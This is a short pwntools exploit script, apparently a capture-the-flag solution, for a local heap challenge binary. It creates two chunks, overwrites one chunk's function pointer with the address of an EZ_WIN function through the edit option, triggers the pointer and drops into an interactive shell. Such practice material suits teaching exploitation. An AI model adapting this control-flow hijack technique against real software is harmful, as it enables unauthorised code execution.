from pwn import *
# Set up the binary and context
binary = './pwn/heap/heap-2/heap2'
elf = ELF(binary)
context.binary = binary

# Start the process
p = process(binary)

def new_meme(size, content):
    p.sendlineafter('> ', '1')
    p.sendlineafter('Enter meme size: ', str(size))
    p.sendafter('Enter meme content: ', content)

def edit_meme(index, content):
    p.sendlineafter('> ', '2')
    p.sendlineafter('Index: ', str(index))
    p.sendlineafter('Enter meme content: ', content)

def print_meme(index):
    p.sendlineafter('> ', '3')
    p.sendlineafter('Index: ', str(index))

# Step 1: Create a new meme
new_meme(0x100, b'A' * 8)  # Meme 0
new_meme(0x100, b'B' * 8)  # Meme 1

# Step 2: Overwrite the function pointer of Meme 0
payload = p64(elf.symbols['EZ_WIN'])  # Overwrite function pointer with EZ_WIN address
edit_meme(0, payload)

# Step 3: Trigger the overwritten function pointer
print_meme(0)

# Interact with the shell
p.interactive()
